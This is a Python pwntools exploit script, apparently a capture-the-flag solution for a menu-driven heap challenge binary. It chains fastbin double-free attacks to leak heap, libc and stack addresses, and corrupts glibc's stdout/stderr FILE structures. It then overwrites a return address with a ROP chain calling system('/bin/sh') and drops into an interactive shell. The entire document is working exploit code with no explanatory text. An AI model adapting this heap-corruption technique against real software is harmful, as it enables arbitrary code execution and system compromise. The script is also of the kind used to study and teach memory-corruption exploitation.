from pwn import *

p = process("./main")
libc = ELF("libc.so.6")

def malloc(index,size,data):
    p.recvuntil(">")
    p.sendline("1")
    p.recvuntil("Index:")
    p.sendline(str(index))
    p.recvuntil("Size:")
    p.sendline(str(size))
    p.recvuntil("Data")
    p.send(data)

def show(index):
    p.recvuntil(">")
    p.sendline("2")
    p.recvuntil("Index")
    p.sendline(str(index))
    return p.recvuntil("1. Malloc")

def free(index):
    p.recvuntil(">")
    p.sendline("3")
    p.recvuntil("Index")
    p.sendline(str(index))


malloc(0,0x40,b"A")  # chungus[0]
malloc(1,0x40,b"B")  # chungus[1]
malloc(2,0x40,b"C")  # chungus[2]
malloc(3,0x40,b"D")  # chungus[3]
malloc(4,0x40,b"E")  # chungus[4]

free(0)
free(1)
free(0)

# Heao leak, in  order to make the fd of the chunk->0 to the
# fake_chunk crafted
heap_leak = show(0)[1:7]
heap_leak = u64(heap_leak+b"\x00\x00")
log.info(f"HEAP:  {hex(heap_leak)}")
malloc(0,0x40,p64(heap_leak-0x10)+p64(0x0)*6+p64(0x51))
malloc(1,0x40,b"A")
malloc(5,0x40,b"B")
malloc(6,0x40,p64(0x0)+p64(0xf1))
free(1)
libc_leak = show(1)[1:7]
libc_leak = u64(libc_leak+b"\x00\x00")
libc.address = libc_leak - 0x3c4b78
free_hook = libc.symbols["__free_hook"]
IO_2_1_stdout = libc.address + 0x3c5620 - 0x50 + 0x5 +0x8
_IO_2_1_stderr_200 = libc.address + 0x3c5620 - 0x10 - 0x8
system = libc.symbols["system"]
environ = libc.symbols["environ"]
binsh = libc.address + 0x18ce17
pop_rdi = libc.address + 0x21112

log.info(f"LIBC:  {hex(libc.address)}")

malloc(0,0x40,b"A")
malloc(1,0x40,b"B")
malloc(2,0x40,b"C")

malloc(0,0x60,b"A")
malloc(1,0x60,b"B")
malloc(2,0x60,b"C")

free(0)
free(2)
free(0)

malloc(0,0x60,p64(IO_2_1_stdout))
malloc(5,0x60,"A")
malloc(2,0x60,"B")
malloc(3,0x60,b"C"*3+p64(0x0)*4+p64(0x71)+p64(0x0))



malloc(0,0x60,b"A")
malloc(1,0x60,b"B")
malloc(2,0x60,b"C")
malloc(3,0x60,b"A")
malloc(4,0x60,b"B")
malloc(5,0x60,b"C")

free(0)
free(2)
free(0)

malloc(0,0x60,p64(_IO_2_1_stderr_200))
malloc(5,0x60,"A")
malloc(2,0x60,"B")
malloc(3,0x60,b"A"*8+p64(0xfbad1800)+p64(0x0)*3+p64(environ)+p64(environ+0x20)*3+p64(environ+0x21))
stack_leak = p.recvuntil(b"Malloc")

stack_leak = u64(stack_leak[1:9])
ret = stack_leak - 0x110 - 0x43
log.info(f"ret :  {hex(ret)}")
malloc(0,0x60,b"A")
malloc(1,0x60,b"B")
malloc(2,0x60,b"C")
malloc(3,0x60,b"A")
malloc(4,0x60,b"B")
malloc(5,0x60,b"C")

free(0)
free(2)
free(0)

malloc(0,0x60,p64(ret))
malloc(5,0x60,"A")
malloc(2,0x60,"B")
malloc(3,0x60,b"A"*19+p64(pop_rdi)+p64(binsh)+p64(system))

p.interactive()
